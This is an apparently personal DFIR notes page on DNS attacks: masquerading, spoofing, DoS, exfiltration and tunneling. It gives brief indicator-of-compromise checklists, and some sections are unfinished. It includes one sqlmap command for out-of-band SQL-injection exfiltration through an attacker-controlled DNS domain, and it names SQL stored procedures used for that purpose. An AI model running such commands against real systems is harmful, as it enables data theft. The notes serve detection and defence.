<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>DNS Tricks And Attacks - Analyst</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="icon" href="https://bakerst221b.com/favicon.png">
  <link href="/css/style-classic.css"></link>
  
  
  <link rel="stylesheet" href="/css/style.min.564b5f4faf3af87992cb8ab298314448914c22dbdb3f2f9c584546b21b8d407c.css">
  

  

</head>

<body class='page page-default-single'>
  <div id="main-menu-mobile" class="main-menu-mobile">
  <ul>
    
    
    <li class="menu-item-home 🏡">
      <a href="/">
        <span>Home 🏡</span>
      </a>
    </li>
    
    <li class="menu-item-blog ✍️">
      <a href="/docs/blog">
        <span>Blog ✍️</span>
      </a>
    </li>
    
    <li class="menu-item-dfir 🔍">
      <a href="/docs/dfir">
        <span>DFIR 🔍</span>
      </a>
    </li>
    
    <li class="menu-item-crypto 🗝️">
      <a href="/docs/cryptography">
        <span>Crypto 🗝️</span>
      </a>
    </li>
    
    <li class="menu-item-reverse 🔧">
      <a href="/docs/reverse">
        <span>Reverse 🔧</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit 🧰">
      <a href="/docs/toolkit">
        <span>Toolkit 🧰</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting 🪤">
      <a href="/docs/thunting">
        <span>Threat Hunting 🪤</span>
      </a>
    </li>
    
    <li class="menu-item-about me 🧝🏽‍♀️">
      <a href="/docs/about">
        <span>About me 🧝🏽‍♀️</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference 📚">
      <a href="/docs/reference">
        <span>Tech Reference 📚</span>
      </a>
    </li>
    
    <li class="menu-item-notes 📝">
      <a href="/docs/notes">
        <span>Notes 📝</span>
      </a>
    </li>
    
  </ul>
</div>
  <div class="wrapper">
    <div class='header'>
  <div class="container">
    <div class="logo">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.png" /></a>
    </div>
    <div class="logo-mobile">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
    </div>
    <div id="main-menu" class="main-menu">
  <ul>
    
    
    <li class="menu-item-home 🏡">
      <a href="/">
        <span>Home 🏡</span>
      </a>
    </li>
    
    <li class="menu-item-blog ✍️">
      <a href="/docs/blog">
        <span>Blog ✍️</span>
      </a>
    </li>
    
    <li class="menu-item-dfir 🔍">
      <a href="/docs/dfir">
        <span>DFIR 🔍</span>
      </a>
    </li>
    
    <li class="menu-item-crypto 🗝️">
      <a href="/docs/cryptography">
        <span>Crypto 🗝️</span>
      </a>
    </li>
    
    <li class="menu-item-reverse 🔧">
      <a href="/docs/reverse">
        <span>Reverse 🔧</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit 🧰">
      <a href="/docs/toolkit">
        <span>Toolkit 🧰</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting 🪤">
      <a href="/docs/thunting">
        <span>Threat Hunting 🪤</span>
      </a>
    </li>
    
    <li class="menu-item-about me 🧝🏽‍♀️">
      <a href="/docs/about">
        <span>About me 🧝🏽‍♀️</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference 📚">
      <a href="/docs/reference">
        <span>Tech Reference 📚</span>
      </a>
    </li>
    
    <li class="menu-item-notes 📝">
      <a href="/docs/notes">
        <span>Notes 📝</span>
      </a>
    </li>
    
  </ul>
</div>
    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
  <span class="hamburger-box">
    <span class="hamburger-inner"></span>
  </span>
</button>
  </div>
</div>


    
    
    
    
    
    

    
    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
      <div class="row">
        <div class="col-12 col-md-3 mb-3">
          <div class="sidebar">
            
<div class="docs-menu">
  <p>
   <a href="/docs/dfir/ioc/"> 👈🏼 Back to </br> 🐾 IoC DB </a>
  </p>
  <aside>
   <nav id="TableOfContents">
  <ul>
    <li><a href="#dns-masquerading-and-fronting">DNS Masquerading and Fronting</a>
      <ul>
        <li><a href="#ioc">IoC</a></li>
      </ul>
    </li>
    <li><a href="#dns-spoofing">DNS Spoofing</a></li>
    <li><a href="#dos">DoS</a>
      <ul>
        <li><a href="#dns-flood-attacks">DNS Flood Attacks</a></li>
        <li><a href="#dns-reflection-attacks">DNS Reflection Attacks</a></li>
        <li><a href="#dns-amplification-attacks">DNS Amplification Attacks</a></li>
      </ul>
    </li>
    <li><a href="#data-exfiltration">Data Exfiltration</a>
      <ul>
        <li><a href="#out-of-band">Out-of-band</a></li>
        <li><a href="#bogous-dns-requests">Bogous DNS requests</a></li>
        <li><a href="#ioc-1">IoC</a></li>
      </ul>
    </li>
    <li><a href="#dns-tunneling">DNS Tunneling</a>
      <ul>
        <li><a href="#txt-record">TXT record</a></li>
        <li><a href="#ioc-2">IoC</a></li>
      </ul>
    </li>
    <li><a href="#references">References</a>
      <ul>
        <li><a href="#2">2</a></li>
      </ul>
    </li>
  </ul>
</nav>
 </aside>
</div>



          </div>
        </div>
        <div class="col-12 col-md-9">
          
<h1 class="title">DNS Tricks And Attacks</h1>
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    <div class="meta">
      
      

      
      

      
    </div>
  </header>


  <div class="content" itemprop="articleBody">
    <p><em>This is about &hellip; .</em></p>
<h2 id="dns-masquerading-and-fronting">DNS Masquerading and Fronting</h2>
<h3 id="ioc">IoC</h3>
<ul>
<li>If destination domain != <code>Host</code> header -&gt;
<ul>
<li><code>Host</code> header = legitimate domain (e.g. in the Alexa Top 1M) -&gt; likely domain masquerading.</li>
<li><code>Host</code> header = CDN endpoints (like <code>*.azureedge.net</code>) -&gt; fronting</li>
</ul>
</li>
<li>Destination domain = <code>Host</code> header -&gt; direct HTTP (malicious or not -&gt; depends on the domain analysis itself, might be hacked or rogue).</li>
</ul>
<h2 id="dns-spoofing">DNS Spoofing</h2>
<p>Redirect a user to a rogue website.</p>
<ul>
<li><strong>MiM</strong> – The interception of communications between users and a DNS server in order to route users to a different/malicious IP address.</li>
<li><strong>DNS server compromise</strong> – The direct hijacking of a DNS server, which is configured to return a malicious IP address.</li>
</ul>
<h2 id="dos">DoS</h2>
<p><a href="#2">2</a></p>
<h3 id="dns-flood-attacks">DNS Flood Attacks</h3>
<p>Attackers attempt to flood the servers with legitimate DNS requests or non-existent domains.</p>
<h3 id="dns-reflection-attacks">DNS Reflection Attacks</h3>
<p>Attackers attempt to flood networks using a spoofed address to return the traffic to a victim.</p>
<h3 id="dns-amplification-attacks">DNS Amplification Attacks</h3>
<p>Attackers attempt to take advantage of the ability to store large amounts of data with specifically crafted packets.
Used to exploit the message packet within DNS packets when DNSSEC is implemented.</p>
<h2 id="data-exfiltration">Data Exfiltration</h2>
<p>Uni-directional communication. DNS do not allow to much characters in the domain and subdomain parts, so, exfiltrating load of information would require the attacker to make a lot of DNS requests over a long period of time.</p>
<h3 id="out-of-band">Out-of-band</h3>
<p>XML or SQL injections exploited. For SQL servers stored procedures can be used (for example, Microsoft&rsquo;s<code>master..xp_dirtree()</code> or MySQL <code>LOAD_FILE</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="err">&#39;</span>http://abc’ --level <span class="m">5</span> --risk <span class="m">3</span> --dns-domain &lt;controlled domain&gt;
</span></span></code></pre></div><h3 id="bogous-dns-requests">Bogous DNS requests</h3>
<p>You add data to the subdomain part and thus exfiltrate data. DNS traffic is not usually blocked and is rarely monitored by security tools.</p>
<h3 id="ioc-1">IoC</h3>
<ul>
<li><input disabled="" type="checkbox"> A lot of DNS requests to weird subdomains.</li>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h2 id="dns-tunneling">DNS Tunneling</h2>
<p>Biderectional communication. DNS do not allow to much characters in the domain and subdomain parts, so, exfiltrating load of information would require the attacker to make a lot of DNS requests over a long period of time.</p>
<h3 id="txt-record">TXT record</h3>
<p>Not clear. This method was mentioned in the Hands-on Incident Response and Digital Forensics book. Also, here are some slides on the topic - <a href="https://deepsec.net/docs/Slides/2018/DNS_Exfiltration_and_Out-of-Band_Attacks_Nitesh_Shilpkar.pdf">https://deepsec.net/docs/Slides/2018/DNS_Exfiltration_and_Out-of-Band_Attacks_Nitesh_Shilpkar.pdf</a>.</p>
<h3 id="ioc-2">IoC</h3>
<ul>
<li><input disabled="" type="checkbox"> A lot of DNS requests to weird subdomains.</li>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h2 id="references">References</h2>
<details>
    <summary>Expand&hellip;</summary>
    <h3 id="1">1</h3>
<p>Defining Cobalt Strike Components So You Can BEA-CONfident in Your Analysis. This article already contains a heavy analysis of the tool - <a href="https://www.mandiant.com/resources/blog/defining-cobalt-strike-components">https://www.mandiant.com/resources/blog/defining-cobalt-strike-components</a>
</details>
<h3 id="2">2</h3>
<p><a href="https://deepsec.net/docs/Slides/2018/DNS_Exfiltration_and_Out-of-Band_Attacks_Nitesh_Shilpkar.pdf">https://deepsec.net/docs/Slides/2018/DNS_Exfiltration_and_Out-of-Band_Attacks_Nitesh_Shilpkar.pdf</a></p>
  </div>
</article>
</div>
</div>

        </div>
      </div>
    </div>
    
  </div>

  <div class="sub-footer">
  <div class="container">
    <div class="row">
      <div class="col-12">
        <div class="sub-footer-inner">
          <ul>
            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>
</div>

  

  
  

  
  <script type="text/javascript" src="/js/scripts.min.302a6fc365d5139fb98cf60bdb8f715d96257ea189161d36c190ccfa8182e569.js"></script>
  

  
  
  
    
  


</body>

</html>
